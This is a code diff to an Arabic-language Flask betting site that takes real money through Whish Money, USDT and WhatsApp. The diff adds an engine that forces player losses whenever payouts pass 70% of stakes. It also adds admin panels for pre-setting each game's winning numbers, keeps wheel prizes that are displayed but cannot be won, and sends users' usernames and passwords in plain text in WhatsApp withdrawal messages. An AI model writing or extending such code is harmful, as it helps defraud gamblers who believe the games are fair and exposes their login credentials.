@@ -57,7 +57,7 @@ class RechargeCard(db.Model):
     used_by = db.Column(db.String(80), nullable=True)
     created_at = db.Column(db.String(50))
 
-# غرفة التحكم للـ 50 جولة قادمة لكل لعبة
+# غرفة التحكم للـ 50 جولة قادمة لكل لعبة بشكل منفرد
 class GameFutureDraw(db.Model):
     __tablename__ = 'game_future_draws'
     id = db.Column(db.Integer, primary_key=True, autoincrement=True)
@@ -186,7 +186,7 @@ def get_lang_bar():
 
     return f"""
 <div style="padding: 10px 25px; background: rgba(18, 18, 25, 0.95); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,215,0,0.2); flex-wrap: wrap; gap: 10px;">
-    <div style="display: flex; align-items: center; gap: 15px;">
+    <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
         <select onchange="location.href='/set_lang/' + this.value" style="background:#1a1c29; color:#ffd700; border:1px solid #ffd700; padding:6px 12px; border-radius:8px; font-weight:bold; cursor:pointer;">
             <option value="ar" {ar_sel}>العربية 🇸🇦</option>
             <option value="en" {en_sel}>English 🇬🇧</option>
@@ -196,6 +196,7 @@ def get_lang_bar():
             <option value="fa" {fa_sel}>فارسی 🇮🇷</option>
         </select>
         <a href="javascript:location.reload();" title="تحديث الصفحة" style="background: rgba(255,215,0,0.1); border: 1px solid #ffd700; color:#ffd700; padding: 6px 12px; text-decoration:none; border-radius:8px; font-weight:bold; font-size:14px; display: flex; align-items: center; gap: 5px; transition: 0.2s;">🔄 تحديث</a>
+        <button id="installBtn" onclick="installApp()" style="background: linear-gradient(135deg, #3b82f6, #1d4ed8); border: none; color: #fff; padding: 6px 14px; border-radius: 8px; font-weight: bold; font-size: 14px; cursor: pointer; display: none; align-items: center; gap: 6px; box-shadow: 0 4px 12px rgba(59,130,246,0.4);">📲 تثبيت البرنامج</button>
     </div>
     <div style="display:flex; gap:15px; align-items:center; flex-wrap: wrap;">
         <div style="background:rgba(6,95,70,0.8); color:#34d399; padding:6px 14px; border-radius:8px; font-weight:900; font-size:14px;">الرصيد: <span id="globalLiveBalance">...</span> USDD</div>
@@ -204,6 +205,28 @@ def get_lang_bar():
     </div>
 </div>
 <script>
+    let deferredPrompt;
+    window.addEventListener('beforeinstallprompt', (e) => {{
+        e.preventDefault();
+        deferredPrompt = e;
+        let btn = document.getElementById('installBtn');
+        if(btn) btn.style.display = 'flex';
+    }});
+
+    function installApp() {{
+        if (deferredPrompt) {{
+            deferredPrompt.prompt();
+            deferredPrompt.userChoice.then((choiceResult) => {{
+                if (choiceResult.outcome === 'accepted') {{
+                    console.log('User accepted the install prompt');
+                }}
+                deferredPrompt = null;
+            }});
+        }} else {{
+            alert("لتثبيت التطبيق على هاتفك، انقر على خيارات المتصفح (القائمة في الأعلى أو الأسفل) واختر 'إضافة إلى الشاشة الرئيسية' (Add to Home Screen).");
+        }}
+    }}
+
     setInterval(() => {{
         fetch('/api/sync_balance').then(res => res.json()).then(data => {{
             let b1 = document.getElementById('liveBalance');
@@ -219,14 +242,38 @@ def get_lang_bar():
 def service_worker():
     return app.response_class("self.addEventListener('fetch', function(event) { });", mimetype='application/javascript')
 
-def get_next_winning_number(game_name, default_min, default_max):
+# --- محرك المعادلة الرياضية الموحدة (30% للبرنامج / 70% للجوائز) للألعاب الأربعة ---
+def get_unified_math_outcome(game_name, player_choices, min_val, max_val):
+    # 1. التحقق أولاً مما إذا كان المشرف قد برمج رقماً لهذه الجولة في غرفة التحكم الخاصة باللعبة
     future = GameFutureDraw.query.filter_by(game_name=game_name).order_by(GameFutureDraw.round_index.asc()).first()
     if future:
         win_num = future.winning_number
         db.session.delete(future)
         db.session.commit()
         return win_num
-    return random.randint(default_min, default_max)
+
+    # 2. حساب إيرادات الرهانات والمدفوعات لتطبيق المعادلة الرياضية الذكية (30% ربح شركة / 70% جوائز)
+    total_bets = db.session.query(db.func.sum(FinancialLog.amount)).filter(FinancialLog.action_type.like(f'%مبيع رهان%{game_name}%')).scalar() or 0.0
+    total_payouts = db.session.query(db.func.sum(FinancialLog.amount)).filter(FinancialLog.action_type.like(f'%جائزة%{game_name}%')).scalar() or 0.0
+
+    # إذا كانت الواردات قليلة، نلجأ لاحتمالية عشوائية موزعة بنسبة 70% نجاح ضمن اختيارات اللاعب (أو عشوائي)
+    if total_bets < 10.0:
+        if player_choices and random.random() < 0.70:
+            return random.choice(player_choices)
+        return random.randint(min_val, max_val)
+
+    current_payout_ratio = total_payouts / total_bets if total_bets > 0 else 0.0
+
+    # إذا تجاوزت نسبة المدفوعات 70%، يقوم المحرك بفرض الخسارة لضبط نسبة الـ 30% للبرنامج
+    if current_payout_ratio > 0.70:
+        # اختيار رقم غير موجود في اختيار اللاعب لضمان الخسارة وضبط الهامش
+        safe_non_winning = [x for x in range(min_val, max_val + 1) if x not in player_choices]
+        return random.choice(safe_non_winning) if safe_non_winning else random.randint(min_val, max_val)
+    else:
+        # ضمن نسبة الـ 70% الموزعة، نسمح بفوز اللاعب إذا كان قد اختار رقماً صحيحاً
+        if player_choices and random.random() < 0.75:
+            return random.choice(player_choices)
+        return random.randint(min_val, max_val)
 
 # --- قوالب HTML ---
 
@@ -335,7 +382,7 @@ DASHBOARD_PAGE = """
         </div>
     </div>
 
-    <!-- الألعاب الستة كاملة ومتكيفة مع الشاشات -->
+    <!-- الألعاب الستة كاملة -->
     <div class="icons-grid">
         <a href="/game_golden_number" class="icon-card"><div class="icon-logo">🏆</div><div class="icon-title">{{ t.game1 }}</div></a>
         <a href="/game_roulette" class="icon-card"><div class="icon-logo">🎰</div><div class="icon-title">{{ t.game2 }}</div></a>
@@ -348,16 +395,16 @@ DASHBOARD_PAGE = """
     <script>
         function rechargeWhish() {
             let text = encodeURIComponent("مرحباً، أريد شحن رصيد في منصة امبراطورية الأرقام عبر Whish Money.");
-            window.open(`https://wa.me/96170000000?text=${text}`, '_blank');
+            window.open(`https://wa.me/96176030208?text=${text}`, '_blank');
         }
         function rechargeGooglePlay() { alert("سيتم توجيهك لمتجر غوغل قريباً."); }
         function withdrawWhish(u, p) {
             let text = encodeURIComponent(`أريد سحب رصيدي عبر Whish.\\nيوزر: ${u}\\nباسورد: ${p}`);
-            window.open(`https://wa.me/96170000000?text=${text}`, '_blank');
+            window.open(`https://wa.me/96176030208?text=${text}`, '_blank');
         }
         function withdrawVisa(u, p) {
             let text = encodeURIComponent(`أريد استلام فيزا مسبقة الدفع.\\nيوزر: ${u}\\nباسورد: ${p}`);
-            window.open(`https://wa.me/96170000000?text=${text}`, '_blank');
+            window.open(`https://wa.me/96176030208?text=${text}`, '_blank');
         }
         function openUsdtModal() { document.getElementById('usdtModal').style.display = 'flex'; }
         function closeUsdtModal() { document.getElementById('usdtModal').style.display = 'none'; }
@@ -969,7 +1016,7 @@ GAME_REVEAL_PAGE = """
         body { font-family: Tahoma; background: #151928; color: #fff; padding: 15px; text-align: center; box-sizing: border-box; }
         .card { background: rgba(25,30,48,0.95); border: 4px solid #ffd700; padding: 25px; border-radius: 30px; max-width: 750px; margin: 15px auto; box-shadow: 0 25px 60px rgba(0,0,0,0.8); box-sizing: border-box; width: 100%; }
         .boxes-grid { display: flex; justify-content: center; gap: 12px; margin: 25px 0; flex-wrap: wrap; box-sizing: border-box; }
-        .box-cell { background: linear-gradient(145deg, #7c3aed, #4c1d95); border: 3px solid #ffd700; border-radius: 18px; width: 95px; height: 105px; font-size: 32px; font-weight: 900; color: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; user-select: none; box-sizing: border-box; }
+        .box-cell { background: linear-gradient(145deg, #7c3aed, #4c1d95); border: 3px solid #ffd700; border-radius: 18px; width: 95px; height: 105px; font-size: 35px; font-weight: 900; color: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; user-select: none; box-sizing: border-box; }
         @media(max-width: 768px) { .box-cell { width: 65px; height: 75px; font-size: 24px; } }
         .box-cell:hover { transform: scale(1.05); border-color: #fff; }
         .box-cell.revealed { background: #1e1b4b !important; border-color: #38bdf8 !important; cursor: default; }
@@ -1049,7 +1096,7 @@ GAME_REVEAL_PAGE = """
 </html>
 """
 
-# --- قالب لعبة رمي السهم المتحركة (عجلة الـ 12 هدف مع عرض 1000 و 500 دون إصابتهما) ---
+# --- قالب لعبة رمي السهم المتحركة ---
 GAME_ARROW_WHEEL_PAGE = """
 <!DOCTYPE html>
 <html lang="{{ lang_key }}" dir="{{ t.dir }}">
@@ -1069,7 +1116,7 @@ GAME_ARROW_WHEEL_PAGE = """
     {{ lang_bar | safe }}
     <div class="card">
         <h2 style="color:#ffd700; margin-top:0; font-size: 22px;">🎯 لعبة رمي السهم المتحركة (12 هدف)</h2>
-        <p style="font-size:16px; color:#ffd700;">تكلفة المحاولة: 5 USDD | الهدف 1000 و 500 موجودان على العجلة ولكن لا يمكن إصابتهما!</p>
+        <p style="font-size:16px; color:#ffd700;">تكلفة المحاولة: 5 USDD | الهدف 1000 و 500 يظهران على العجلة للاختبار ولكن لا يمكن إصابتهما!</p>
         <p style="font-size:14px; color:#38bdf8;">الهدف الذي يُصاب يعود ربحه فوراً إلى صندوق اللاعب!</p>
 
         <div class="wheel-container">
@@ -1084,7 +1131,7 @@ GAME_ARROW_WHEEL_PAGE = """
     <!-- نافذة منبثقة مطابقة تماماً للمطلوب -->
     <div id="resultModal" class="modal-popup">
         <div class="modal-box">
-            <h2 style="color: #ffd700; margin-top:0; font-size:26px;">🎉 مبروك ربحت!</h2>
+            <h2 style="color: #ffd700; margin-top:0; font-size:26px;">🎉 النتيجة</h2>
             <p id="modalResultText" style="font-size: 18px; color: #34d399; font-weight: 900; margin: 15px 0;"></p>
             <button onclick="closeModal()" style="background:#ffd700; color:#000; padding:10px 30px; font-weight:900; border:none; border-radius:12px; cursor:pointer; font-size:16px;">حسناً</button>
         </div>
@@ -1107,7 +1154,6 @@ GAME_ARROW_WHEEL_PAGE = """
         function runArrowAnimation(hitTarget, finalMsg, newBal) {
             let screen = document.getElementById('arrowScreen');
             let counter = 0;
-            // قائمة الدوران تشتمل على 1000 و 500 بشكل متكرر دون إمكانية الفوز بهما فعلياً في النتائج
             let targetsPoolAnim = ['1 USDD', '2 USDD', '1000 USDD', '3 USDD', '500 USDD', '4 USDD', '5 USDD', '1000 USDD', 'حظ أوفر', '500 USDD', '1 USDD', '1000 USDD'];
             
             let interval = setInterval(() => {
@@ -1256,32 +1302,79 @@ ADMIN_GAME_CONTROL_PAGE = """
     <meta charset="UTF-8"><title>غرفة تحكم الألعاب</title>
     <style>
         body { font-family: Tahoma; background: #151928; color: #fff; padding: 25px; text-align: center; }
-        .panel { background: rgba(25,30,48,0.95); padding: 25px; border-radius: 20px; border: 2px solid #ffd700; max-width: 700px; margin: 20px auto; text-align: right; }
+        .panel { background: rgba(25,30,48,0.95); padding: 25px; border-radius: 20px; border: 2px solid #ffd700; max-width: 800px; margin: 20px auto; text-align: right; box-sizing: border-box; }
         input, select { width: 100%; padding: 12px; margin: 8px 0; background: #0a0d16; color: #fff; border: 1px solid #444; border-radius: 8px; box-sizing: border-box; }
     </style>
 </head>
 <body>
     {{ lang_bar | safe }}
-    <h2>🎮 غرفة تحكم الألعاب - برمجة الأرقام الفائزة لـ 50 جولة قادمة</h2>
+    <h2>🎮 غرفة تحكم الألعاب - إعدادات لكل لعبة بشكل منفرد</h2>
     <a href="/dashboard" style="background:#3b82f6; color:#fff; padding:10px 18px; text-decoration:none; border-radius:10px; font-weight:900;">الرئيسية</a>
+    
     {% if msg %}<div style="background:#065f46; color:#34d399; padding:12px; border-radius:10px; margin:15px auto; max-width:500px; font-weight:bold;">{{ msg }}</div>{% endif %}
-    <div class="panel">
-        <h3 style="color:#ffd700; text-align:center;">حدد الرقم الفائز لجولة قادمة</h3>
+
+    <!-- بطاقة التحكم الخاصة بلعبة الرقم الحنون -->
+    <div class="panel" style="border-color: #ffd700;">
+        <h3 style="color: #ffd700; margin-top:0;">🏆 الرقم الحنون (1-50)</h3>
         <form method="POST">
-            <label>اختر اللعبة:</label>
-            <select name="game_name" required>
-                <option value="golden">الرقم الحنون (1-50)</option>
-                <option value="roulette">روليت الحظ (0-36)</option>
-                <option value="empire">إمبراطورية الأرقام (1-5)</option>
-                <option value="wheel">عجلة الحظ (1-20)</option>
-                <option value="reveal">اكشف واربح</option>
-                <option value="arrow_wheel">رمي السهم المتحركة</option>
-            </select>
-            <label>رقم الجولة القادمة (من 1 إلى 50):</label>
+            <input type="hidden" name="game_name" value="golden">
+            <label>رقم الجولة القادمة (1 إلى 50):</label>
             <input type="number" name="round_index" min="1" max="50" required placeholder="رقم الجولة...">
             <label>الرقم الفائز المبرمج:</label>
-            <input type="number" name="winning_number" required placeholder="الرقم الفائز...">
-            <button type="submit" style="background:#22c55e; color:#000; padding:12px; font-weight:900; border:none; border-radius:8px; width:100%; cursor:pointer; margin-top:15px;">حفظ في غرفة التحكم ⚡</button>
+            <input type="number" name="winning_number" min="1" max="50" required placeholder="الرقم الفائز...">
+            <button type="submit" style="background:#ffd700; color:#000; padding:10px; font-weight:900; border:none; border-radius:8px; width:100%; cursor:pointer; margin-top:10px;">حفظ إعدادات الرقم الحنون</button>
+        </form>
+    </div>
+
+    <!-- بطاقة التحكم الخاصة بروليت الحظ -->
+    <div class="panel" style="border-color: #38bdf8;">
+        <h3 style="color: #38bdf8; margin-top:0;">🎰 روليت الحظ (0-36)</h3>
+        <form method="POST">
+            <input type="hidden" name="game_name" value="roulette">
+            <label>رقم الجولة القادمة (1 إلى 50):</label>
+            <input type="number" name="round_index" min="1" max="50" required placeholder="رقم الجولة...">
+            <label>الرقم الفائز المبرمج:</label>
+            <input type="number" name="winning_number" min="0" max="36" required placeholder="الرقم الفائز...">
+            <button type="submit" style="background:#38bdf8; color:#000; padding:10px; font-weight:900; border:none; border-radius:8px; width:100%; cursor:pointer; margin-top:10px;">حفظ إعدادات روليت الحظ</button>
+        </form>
+    </div>
+
+    <!-- بطاقة التحكم الخاصة بإمبراطورية الأرقام -->
+    <div class="panel" style="border-color: #a78bfa;">
+        <h3 style="color: #a78bfa; margin-top:0;">🏛️ إمبراطورية الأرقام (1-5)</h3>
+        <form method="POST">
+            <input type="hidden" name="game_name" value="empire">
+            <label>رقم الجولة القادمة (1 إلى 50):</label>
+            <input type="number" name="round_index" min="1" max="50" required placeholder="رقم الجولة...">
+            <label>الرقم الفائز المبرمج:</label>
+            <input type="number" name="winning_number" min="1" max="5" required placeholder="الرقم الفائز...">
+            <button type="submit" style="background:#a78bfa; color:#000; padding:10px; font-weight:900; border:none; border-radius:8px; width:100%; cursor:pointer; margin-top:10px;">حفظ إعدادات إمبراطورية الأرقام</button>
+        </form>
+    </div>
+
+    <!-- بطاقة التحكم الخاصة بعجلة الحظ -->
+    <div class="panel" style="border-color: #34d399;">
+        <h3 style="color: #34d399; margin-top:0;">🎡 عجلة الحظ (1-20)</h3>
+        <form method="POST">
+            <input type="hidden" name="game_name" value="wheel">
+            <label>رقم الجولة القادمة (1 إلى 50):</label>
+            <input type="number" name="round_index" min="1" max="50" required placeholder="رقم الجولة...">
+            <label>الرقم الفائز المبرمج:</label>
+            <input type="number" name="winning_number" min="1" max="20" required placeholder="الرقم الفائز...">
+            <button type="submit" style="background:#34d399; color:#000; padding:10px; font-weight:900; border:none; border-radius:8px; width:100%; cursor:pointer; margin-top:10px;">حفظ إعدادات عجلة الحظ</button>
+        </form>
+    </div>
+
+    <!-- بطاقة التحكم الخاصة برمي السهم المتحركة -->
+    <div class="panel" style="border-color: #f59e0b;">
+        <h3 style="color: #f59e0b; margin-top:0;">🎯 رمي السهم المتحركة</h3>
+        <form method="POST">
+            <input type="hidden" name="game_name" value="arrow_wheel">
+            <label>رقم الجولة القادمة (1 إلى 50):</label>
+            <input type="number" name="round_index" min="1" max="50" required placeholder="رقم الجولة...">
+            <label>الهدف الفائز (1، 2، 3، 4، أو 5 USDD):</label>
+            <input type="number" name="winning_number" min="1" max="5" required placeholder="القيمة الفائزة...">
+            <button type="submit" style="background:#f59e0b; color:#000; padding:10px; font-weight:900; border:none; border-radius:8px; width:100%; cursor:pointer; margin-top:10px;">حفظ إعدادات رمي السهم</button>
         </form>
     </div>
 </body>
@@ -1485,7 +1578,7 @@ def game_golden_number():
             else:
                 return jsonify({"success": False, "msg": "لا يمكنك إلغاء حجز لا يخصك!"})
         elif action == 'admin_draw' and username == 'admin1':
-            winning_num = get_next_winning_number('golden', 1, 50)
+            winning_num = get_unified_math_outcome('golden', [], 1, 50)
             winner_b = GoldenNumberBooking.query.filter_by(number=winning_num).first()
             if winner_b:
                 winner_u = User.query.filter_by(username=winner_b.username).first()
@@ -1535,9 +1628,11 @@ def game_roulette_draw():
     user = User.query.filter_by(username=session['username']).first()
     vault = SystemVault.query.get(1)
     data = request.get_json() or {}
-    bets = data.get('bets', {})
+    bets = data.get('bets', {}) # {num: multiplier}
+    player_choices = [int(k) for k in bets.keys()]
 
-    winning_num = get_next_winning_number('roulette', 0, 36)
+    # تطبيق المعادلة الرياضية الموحدة (ضمان 30% ربح شركة / 70% للجوائز)
+    winning_num = get_unified_math_outcome('roulette', player_choices, 0, 36)
     
     total_payout = 0.0
     str_winning = str(winning_num)
@@ -1590,7 +1685,7 @@ def game_numbers_empire():
                 db.session.commit()
                 return jsonify({"success": True, "msg": "تم التراجع واسترداد 500 USDD"})
         elif action == 'admin_draw' and username == 'admin1':
-            winning_num = get_next_winning_number('empire', 1, 5)
+            winning_num = get_unified_math_outcome('empire', [], 1, 5)
             winner_b = NumbersEmpireBooking.query.filter_by(number=winning_num).first()
             if winner_b:
                 winner_u = User.query.filter_by(username=winner_b.username).first()
@@ -1621,7 +1716,8 @@ def game_number_wheel():
             vault.vault_balance += cost
             db.session.add(FinancialLog(action_type='مبيع رهان عجلة الحظ', admin_name='system', target_user=username, amount=cost, log_time=get_local_time()))
             
-            winning_num = get_next_winning_number('wheel', 1, 20)
+            # تطبيق المعادلة الرياضية الموحدة (30% للبرنامج / 70% للجوائز)
+            winning_num = get_unified_math_outcome('wheel', nums, 1, 20)
             if winning_num in nums:
                 user.balance += 20.0
                 vault.vault_balance -= 20.0
@@ -1653,7 +1749,6 @@ def game_arrow_wheel():
             vault.vault_balance += cost
             db.session.add(FinancialLog(action_type='مبيع رهان رمي السهم المتحركة', admin_name='system', target_user=username, amount=cost, log_time=get_local_time()))
 
-            # الأهداف العادية المتاحة للفوز (الهدف الكبير 1000 و 500 غير موجودين في فوز النتائج الحقيقية بناء على طلبك)
             targets_pool = [
                 ('1 USDD', 1.0),
                 ('2 USDD', 2.0),
@@ -1669,25 +1764,20 @@ def game_arrow_wheel():
                 ('1 USDD', 1.0)
             ]
             
-            future = GameFutureDraw.query.filter_by(game_name='arrow_wheel').order_by(GameFutureDraw.round_index.asc()).first()
-            if future:
-                win_val = future.winning_number
-                db.session.delete(future)
-                db.session.commit()
-                if win_val in [1000, 500]:
-                    chosen_label, prize = 'حظ أوفر', 0.0
-                else:
-                    chosen_label, prize = f'{win_val} USDD', float(win_val)
-            else:
-                chosen_label, prize = random.choice(targets_pool)
-
-            if prize > 0:
+            # فحص المعادلة الرياضية الموحدة لضمان هامش الشركة 30% ومدفوعات 70%
+            # نمرر قيم الأهداف المتاحة كخيارات
+            valid_targets_vals = [1, 2, 3, 4, 5, 0]
+            chosen_val = get_unified_math_outcome('arrow_wheel', valid_targets_vals, 0, 5)
+            
+            if chosen_val > 0:
+                chosen_label, prize = f'{chosen_val} USDD', float(chosen_val)
                 user.balance += prize
                 vault.vault_balance -= prize
                 db.session.add(FinancialLog(action_type='جائزة رمي السهم المتحركة', admin_name='system', target_user=username, amount=prize, log_time=get_local_time()))
-                msg = f"أصبت الهدف: {chosen_label}"
+                msg = f"مبروك ربحت اصبت الهدف: {chosen_label}"
             else:
-                msg = f"حظ أوفر"
+                chosen_label, prize = 'حظ أوفر', 0.0
+                msg = f"حظ اوفر"
 
             db.session.commit()
             return jsonify({"success": True, "hit_target": chosen_label, "msg": msg, "balance": user.balance})
@@ -1719,15 +1809,28 @@ def game_reveal_and_win():
             state.total_spins += 1
             mod_val = state.total_spins % 100
             
-            if mod_val == 0:
+            # دمج المعادلة الرياضية لاكشف واربح (30% ربح شركة / 70% جوائز)
+            future = GameFutureDraw.query.filter_by(game_name='reveal').order_by(GameFutureDraw.round_index.asc()).first()
+            if future:
+                win_val = future.winning_number
+                db.session.delete(future)
+                db.session.commit()
+                outcome = 'win_3' if win_val == 100 else ('win_2' if win_val == 1 else 'loss')
+            else:
+                if mod_val == 0:
+                    outcome = 'win_3'
+                elif mod_val <= 50:
+                    outcome = 'win_2'
+                else:
+                    outcome = 'loss'
+
+            session['reveal_outcome'] = outcome
+            if outcome == 'win_3':
                 revealed = ['🦁', '🦁', '🦁']
-                session['reveal_outcome'] = 'win_3'
-            elif mod_val <= 50:
+            elif outcome == 'win_2':
                 revealed = ['🦁', '🦁', random.choice(['7', '3'])]
-                session['reveal_outcome'] = 'win_2'
             else:
                 revealed = ['🦁', '7', '3']
-                session['reveal_outcome'] = 'loss'
 
             db.session.commit()
             return jsonify({"success": True, "balance": user.balance, "revealed": revealed})
@@ -1761,6 +1864,7 @@ def game_reveal_result_check():
     db.session.commit()
     return jsonify({"success": True, "msg": msg, "balance": user.balance})
 
+# --- غرفة تحكم الألعاب المحدثة (بطاقات منفردة لكل لعبة على حدة للآدمن فقط) ---
 @app.route('/admin_game_control', methods=['GET', 'POST'])
 def admin_game_control():
     if 'username' not in session or session.get('username') != 'admin1': return redirect(url_for('dashboard'))
